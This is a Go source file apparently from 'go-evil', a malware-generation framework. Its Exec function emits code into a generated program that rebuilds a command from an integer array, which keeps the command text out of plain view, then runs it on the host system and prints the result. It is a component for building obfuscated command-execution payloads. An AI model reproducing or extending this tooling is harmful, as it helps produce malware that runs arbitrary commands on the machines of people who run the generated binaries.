package system

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Executes a command on the running OS and prints the result
func Exec(s_json string, cmd string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Exec"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", function_call),
		"cmd := spine.alpha.construct_string(repr)",
		"cmd = spine.variable.get(cmd)",
		"split_cmd := strings.Split(cmd, \" \")",
		"cmd = strings.ReplaceAll(split_cmd[0], \"\\\"\", \"\")",
		"args := strings.ReplaceAll(strings.Join(split_cmd[1:], \" \"), \"\\\"\", \"\")",
		"out, err := exec.Command(cmd, args).Output()",
		"if err != nil {",
		"fmt.Println(err.Error())",
		"}else{",
		"fmt.Println(string(out[:]))",
		"}}"})

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("strings")

	// Construct our int array
	parameter := data_object.Generate_int_array_parameter(cmd)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
}
